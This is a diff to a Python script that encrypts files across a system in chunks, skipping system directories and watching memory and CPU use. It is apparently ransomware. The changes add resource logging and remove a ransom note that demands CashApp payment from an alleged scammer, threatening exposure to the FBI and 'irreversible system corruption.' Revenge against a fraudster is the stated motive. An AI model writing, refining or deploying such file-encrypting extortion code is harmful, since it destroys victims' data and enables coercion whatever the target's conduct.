@@ -7,7 +7,7 @@ import platform
 import logging
 import signal
 import time
-import psutil
+import psutil  # New import for dynamic resource handling
 from cryptography.fernet import Fernet
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -49,14 +49,14 @@ python_env_path = os.path.dirname(os.path.dirname(sys.executable))
 # Get the Node.js environment path managed by nvm
 nvm_path = os.path.expanduser("~/.nvm")
 
-# Get common system paths to exclude, including the newly added /proc directory
+# Get common system paths to exclude
 system_paths = [
     "/usr/share",
     "/var/log",
     "/dev",
     "/sys",
     "/proc",  # Added to prevent freezing
-    "/usr/lib/php"
+    "/usr/lib"
 ]
 
 # Function to encrypt a file
@@ -110,6 +110,8 @@ def encrypt_files_in_chunks(root_dir, exclude_paths, chunk_size=10):
     for chunk in process_files_in_chunks(all_files, chunk_size):
         # Dynamic handling of memory and CPU
         available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
+        cpu_usage = psutil.cpu_percent(interval=1)
+        logging.debug(f"Available memory: {available_memory:.2f}%, CPU usage: {cpu_usage:.2f}%")
         if available_memory < 20:  # If available memory is less than 20%
             logging.warning("Low memory. Pausing encryption for 5 seconds...")
             time.sleep(5)
@@ -146,18 +148,9 @@ def main():
 if __name__ == "__main__":
     main()
 
+    
 
 
-
-
-
-    print("\nDidnt your mom ever tell you to not scam innocent people?\n")
-    print("Many of your files have been encrypted. You will cashapp me ($SBussisoDube) the ammount you have written for the fraudulent check you sent me via email ($7,425.79 USD)")
-    print("not only are your files encrypted I also have information on who you are and your real location despite your efforts to hide them")
-    print("if you fail to do so I will hand everything over to the FBI including your real identity and location which will then be given to the proper authorities to reach you.")
-    print("you have 24 hours to respond")
-    print("you will respond via the same email thread you sent the counterfit check")
-    print("failure to respond as instructed will result in irreversible system corruption")
     bird = """
 
     ░░░░░░░░░░░░░░░▄▄░░░░░░░░░░░
